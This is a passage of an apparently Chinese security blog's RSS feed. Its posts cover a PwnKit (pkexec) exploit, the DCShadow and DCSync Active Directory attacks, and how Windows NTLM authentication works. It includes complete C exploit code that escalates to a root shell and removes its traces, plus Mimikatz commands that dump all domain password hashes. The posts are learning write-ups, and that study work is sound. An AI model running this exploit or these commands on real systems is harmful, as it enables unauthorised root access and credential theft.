&lt;p&gt;POC中最终寻找到的是&lt;code&gt;GCONV_PATH&lt;/code&gt;环境变量，利用其完成恶意so文件加载并执行恶意代码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;exp：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;void gconv() {}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;void gconv_init() {&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;       setuid(0); setgid(0);&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;       seteuid(0); setegid(0);&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;       system(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &amp;#39;GCONV_PATH=.&amp;#39; &amp;#39;pwnkit&amp;#39;; /bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;       exit(0);&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;s&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;mkdir -p &amp;#39;GCONV_PATH=.&amp;#39;; touch &amp;#39;GCONV_PATH=./pwnkit&amp;#39;; chmod a+x &amp;#39;GCONV_PATH=./pwnkit&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;mkdir -p pwnkit; echo &amp;#39;module UTF-8// PWNKIT// pwnkit 2&amp;#39; &amp;gt; pwnkit/gconv-modules&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pwnkit/pwnkit.c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
        &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;pwnkit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;PATH=GCONV_PATH=.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;CHARSET=PWNKIT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;SHELL=pwnkit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;execve&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/usr/bin/pkexec&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]){&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 683; 
			flex-basis: 1640px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798.png&#34; data-size=&#34;998x146&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798.png&#34;
			width=&#34;998&#34;
			height=&#34;146&#34;
			srcset=&#34;https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798_hua881c43fa9854f5d9232c3fb057aea99_31021_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-1/image-20220223171504798_hua881c43fa9854f5d9232c3fb057aea99_31021_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DCShadow 攻击</title>
        <link>https://coollllllll.github.io/p/intranet-11/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-11/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-11/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post DCShadow 攻击" /&gt;&lt;h1 id=&#34;dcshadow-攻击&#34;&gt;DCShadow 攻击&lt;/h1&gt;
&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
&lt;p&gt;2018 年 1 月 24 日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 &lt;code&gt;DCShadow&lt;/code&gt;。在具备域管理员权限条件下，攻击者可以创建伪造的域控制器，将预先设定的对象或对象属性复制到正在运行域服务器中。&lt;/p&gt;
&lt;p&gt;**DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器。**Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。&lt;/p&gt;
&lt;p&gt;从 DCShadow 目前展示的功能来看，主要只能用于&lt;strong&gt;红蓝对抗的隐蔽后门&lt;/strong&gt;。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 &lt;code&gt;DCShadow&lt;/code&gt; 的基础，应该会有很多新的攻击方法。&lt;/p&gt;
&lt;h2 id=&#34;流程&#34;&gt;流程&lt;/h2&gt;
&lt;p&gt;DCShadow 的攻击过程包括 3 个主要个步骤:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在目标域的 AD 活动目录注册一个伪造的 DC&lt;/li&gt;
&lt;li&gt;使伪造的 DC 被其他的 DC 认可，能够参与域复制&lt;/li&gt;
&lt;li&gt;强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注册伪造-dc&#34;&gt;注册伪造 DC&lt;/h3&gt;
&lt;p&gt;一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 &lt;code&gt;NTDS-DSA(nTDSDSA)&lt;/code&gt;类对象。注册的位置为 &lt;code&gt;CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 323; 
			flex-basis: 776px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155254328.png&#34; data-size=&#34;1000x309&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155254328.png&#34;
			width=&#34;1000&#34;
			height=&#34;309&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155254328_hu98107c0c322efcd3c9fb40f85023b7ed_407692_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314155254328_hu98107c0c322efcd3c9fb40f85023b7ed_407692_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;adsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01。测试机器为 Win7X86cn04，如果 DCShadow 测试成功的话，则会生成一个新的NTDS-DSA(nTDSDSA)类对象：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 244; 
			flex-basis: 586px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155509416.png&#34; data-size=&#34;1005x411&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155509416.png&#34;
			width=&#34;1005&#34;
			height=&#34;411&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155509416_hu1642c878d93f69bb11cb6a6ee8f9d237_507378_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314155509416_hu1642c878d93f69bb11cb6a6ee8f9d237_507378_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;查看 &lt;code&gt;CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com&lt;/code&gt;的安全描述符，可知必须有&lt;code&gt;域管理员权限&lt;/code&gt;才具备&lt;strong&gt;写权限&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 174; 
			flex-basis: 419px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155705326.png&#34; data-size=&#34;997x571&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155705326.png&#34;
			width=&#34;997&#34;
			height=&#34;571&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314155705326_hubdf185d318a11c29e549854461f895f3_291397_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314155705326_hubdf185d318a11c29e549854461f895f3_291397_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;所以发动 DCShadow 攻击首先必须具备域管理员权限。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;认可-dc&#34;&gt;认可 DC&lt;/h3&gt;
&lt;p&gt;一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 &lt;code&gt;WIN7X86CN04$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;伪造 DC 能认证其他 DC 来访问的账号，通过给 &lt;code&gt;WIN7X86CN04$&lt;/code&gt; 添加 &lt;code&gt;SPN&lt;/code&gt;，可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:&lt;code&gt;DRS&lt;/code&gt;服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 &lt;code&gt;GC&lt;/code&gt;(Global Catalog)服务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 368px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314160705805.png&#34; data-size=&#34;1000x651&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314160705805.png&#34;
			width=&#34;1000&#34;
			height=&#34;651&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314160705805_hu942f5b4ad7eeca0c18e8ad3ac4fdd262_321581_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314160705805_hu942f5b4ad7eeca0c18e8ad3ac4fdd262_321581_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行 DRS 服务，最少需要实现 &lt;code&gt;IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs &lt;/code&gt;这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;发起复制&#34;&gt;发起复制&lt;/h3&gt;
&lt;p&gt;通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用&lt;code&gt; DRSReplicaAdd&lt;/code&gt; 函数接口强制立即发起域复制，DCShadow 正是通过调用·&lt;code&gt;DRSReplicaAdd&lt;/code&gt; 函数强制立即发起域复制。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DCSync 攻击</title>
        <link>https://coollllllll.github.io/p/intranet-10/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-10/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-10/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post DCSync 攻击" /&gt;&lt;h1 id=&#34;dcsync-攻击&#34;&gt;DCSync 攻击&lt;/h1&gt;
&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
&lt;p&gt;2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。&lt;/p&gt;
&lt;p&gt;DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。而DCSync 的最大特点，在于不用登录域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC 不能参与复制同步数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;p&gt;本质就是利用 DC 间的数据同步复制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现网络中的目标域控制器&lt;/li&gt;
&lt;li&gt;通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Samba wiki 关于 GetNCChanges 的描述包括：&lt;/p&gt;
&lt;p&gt;当一个 DC (成为客户端 DC)想从其他 DC (成为服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。&lt;/p&gt;
&lt;p&gt;如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;条件&#34;&gt;条件&lt;/h2&gt;
&lt;p&gt;某用户想要发起 DCSync 攻击，必须具备以下权限：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Replicating Directory Changes (DS-Replication-Get-Changes)&lt;/li&gt;
&lt;li&gt;Replicating Directory Changes All (DS-Replication-Get-Changes-All)&lt;/li&gt;
&lt;li&gt;Replicating Directory Changes In Filtered Set&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 98; 
			flex-basis: 235px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145221023.png&#34; data-size=&#34;1006x1025&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145221023.png&#34;
			width=&#34;1006&#34;
			height=&#34;1025&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145221023_hu331e2b2bbfe170c8c4eea701982ffe60_796442_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-10/image-20220314145221023_hu331e2b2bbfe170c8c4eea701982ffe60_796442_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 161; 
			flex-basis: 386px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145231925.png&#34; data-size=&#34;1004x623&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145231925.png&#34;
			width=&#34;1004&#34;
			height=&#34;623&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145231925_hu1a3b2c3a832c079027deb5256ff66959_344027_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-10/image-20220314145231925_hu1a3b2c3a832c079027deb5256ff66959_344027_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在默认情况下，只有 &lt;strong&gt;Administrators、Domain Controllers 和 Enterprise Domain Admins&lt;/strong&gt; 组内的用户有权限使用 DCSync，但我们可以对域内普通用户添加 ACL (Access Control List) 实现普通用户也能调用 DCSync 功能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;攻击&#34;&gt;攻击&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 导出指定用户
lsadump::dcsync /domain:rd.adsecurity.org /user:administrator 

# 导出域内所有用户
lsadump::dcsync /domain:rd.adsecurity.org /all
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 143; 
			flex-basis: 343px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145824172.png&#34; data-size=&#34;1007x704&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145824172.png&#34;
			width=&#34;1007&#34;
			height=&#34;704&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145824172_hu8541a771b7d54fd8c5b0d9c321d869fa_733918_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-10/image-20220314145824172_hu8541a771b7d54fd8c5b0d9c321d869fa_733918_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;防御&#34;&gt;防御&lt;/h2&gt;
&lt;p&gt;最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步。&lt;/p&gt;
&lt;p&gt;获取域内所有 IP 的脚本：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PowerShell:Get-ADDomainController -filter * | select IPv4Address

[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select IPAddress
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Windows 认证</title>
        <link>https://coollllllll.github.io/p/intranet-12/</link>
        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-12/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-12/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Windows 认证" /&gt;&lt;h1 id=&#34;windows-认证&#34;&gt;Windows 认证&lt;/h1&gt;
&lt;p&gt;Windows 认证方式主要有两种：NTLM 认证、kerberos 认证。同时，Windows Access Token 记录着用户的SID、组ID、Session、及权限等信息，也起到了权限认证的作用。&lt;/p&gt;
&lt;p&gt;其中 NTLM 认证主要有&lt;strong&gt;本地认证&lt;/strong&gt;和&lt;strong&gt;网络认证&lt;/strong&gt;两种方式。&lt;/p&gt;
&lt;h2 id=&#34;本地认证&#34;&gt;本地认证&lt;/h2&gt;
&lt;h3 id=&#34;ntlm&#34;&gt;NTLM&lt;/h3&gt;
&lt;p&gt;NTLM Hash 是支持 Net NTLM 认证协议及本地认证过程中的一个重要参与物，其长度为 32 位，由数字与字母组成。 Windows 本身不存储用户的明文密码，它会将用户的明文密码经过加密算法后存储在 SAM 数据库中。 当用户登录时,将用户输入的明文密码也加密成 NTLM Hash,与 SAM 数据库中的 NTLM Hash 进行比较。NTLM Hash 的前身是 LM Hash，目前基本淘汰，但是还是存在。&lt;/p&gt;
&lt;p&gt;SAM 文件一般在&lt;code&gt;%SystemRoot%\system32\config\sam&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 105; 
			flex-basis: 253px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314170924968.png&#34; data-size=&#34;851x807&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314170924968.png&#34;
			width=&#34;851&#34;
			height=&#34;807&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314170924968_hube41ac9a0b62677678cba31dad5a6fe1_233701_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-12/image-20220314170924968_hube41ac9a0b62677678cba31dad5a6fe1_233701_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;NTLM hash 的产生：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin -&amp;gt; hex(16进制编码) = 61646d696e
61646d696e -&amp;gt; Unicode = 610064006d0069006e00
610064006d0069006e00 -&amp;gt; MD4 = 209c6174da490caeb422f3fa5a7ae634
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;流程&#34;&gt;流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Windows Logon Process，即 winlogon.exe， 是 Windows NT 用户登陆程序，用于管理用户登录和退出。&lt;/li&gt;
&lt;li&gt;LSASS 是微软 Windows 系统的安全机制。用于本地安全和登录策略。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;winlogon.exe -&amp;gt; 接收用户输入的账密 -&amp;gt; lsass.exe -&amp;gt; 转换NTLM hash 并与 SAM 文件中的进行对比 -&amp;gt; 相同则将user SID 和 group SID 发给 winlogon.exe，准备桌面，登录成功
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;网络认证&#34;&gt;网络认证&lt;/h2&gt;
